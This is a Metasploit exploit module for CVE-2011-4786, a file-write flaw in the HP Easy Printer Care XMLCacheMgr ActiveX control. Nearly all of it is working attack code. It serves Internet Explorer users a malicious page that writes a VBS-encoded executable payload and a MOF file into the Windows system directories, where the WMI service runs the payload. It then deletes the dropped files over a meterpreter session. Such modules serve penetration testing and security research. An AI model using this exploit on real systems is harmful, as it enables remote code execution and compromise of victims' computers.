##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Easy Printer Care XMLCacheMgr Class ActiveX Control Remote Code Execution',
			'Description'    => %q{
					This module allows remote attackers to place arbitrary files on a users file
				system by abusing the "CacheDocumentXMLWithId" method from the "XMLCacheMgr"
				class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll
				2.7.2.0).

					Code execution can be achieved by first uploading the payload to the remote
				machine embeddeding a vbs file, and then upload another mof file, which enables
				Windows Management Instrumentation service to execute the vbs. Please note that
				this module currently only works for Windows before Vista.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Andrea Micalizzi',  # aka rgod original discovery
					'juan vazquez',      # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2011-4786'],
					[ 'BID', '51396'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-013/' ],
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#Windows before Vista
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 11 2012'))
	end

	#
	# The following handles deleting the copied vbs payload and mof file
	# See "struts_code_exec.rb" and "ms10_026_dbldecode.rb" for more information.
	#
	def on_new_session(client)

		if client.type != "meterpreter"
			print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
			print_error("The vbs payload and mof file must be removed manually.")
			return
		end

		return if not @var_mof_name
		return if not @var_vbs_name

		# stdapi must be loaded before we can use fs.file
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		cmd = "C:\\windows\\system32\\attrib.exe -r " +
		      "C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"

		client.sys.process.execute(cmd, nil, {'Hidden' => true })

		begin
			print_status("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
			client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
			print_status("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
			client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
		rescue ::Exception => e
			print_error("Exception: #{e.inspect}")
		end

	end

	def on_request_uri(cli, request)

		unless request['User-Agent'] =~ /MSIE/
			send_not_found(cli)
			print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
			return
		end

		# Using Windows Management Instrumentation service to execute the payload.
		# Using code from "blackice_downloadimagefileurl.rb". See it for more information.

		var_xmlcachemgr = rand_text_alpha(rand(5)+5)
		var_mof_function_name = rand_text_alpha(rand(5)+5)

		content = <<-EOS
		<html>
		<head>
		<script>
			var #{var_xmlcachemgr} = new ActiveXObject('HPESPRIT.XMLCacheMgr.1');

			function #{var_mof_function_name}() {
				#{var_xmlcachemgr}.CacheDocumentXMLWithId(
					"c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof",
					unescape("#{@mof_content}"),
					1,
					1
				);
			}

			#{var_xmlcachemgr}.CacheDocumentXMLWithId(
				"C:\\\\WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs",
				unescape("#{@vbs_content}"),
				1,
				1
			);

			setTimeout("#{var_mof_function_name}()", 4000);
		</script>
		</head>
		</html>
		EOS

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, content)
		handler(cli)
	end

	def exploit
		# In order to save binary data to the file system the payload is written to a .vbs
		# file and execute it from there.
		@var_mof_name = rand_text_alpha(rand(5)+5)
		@var_vbs_name = rand_text_alpha(rand(5)+5)

		print_status("Encoding payload into vbs...")
		payload = generate_payload_exe
		@vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))

		print_status("Generating mof file...")
		@mof_content = Rex::Text.to_hex(generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs"))
		super
	end

end
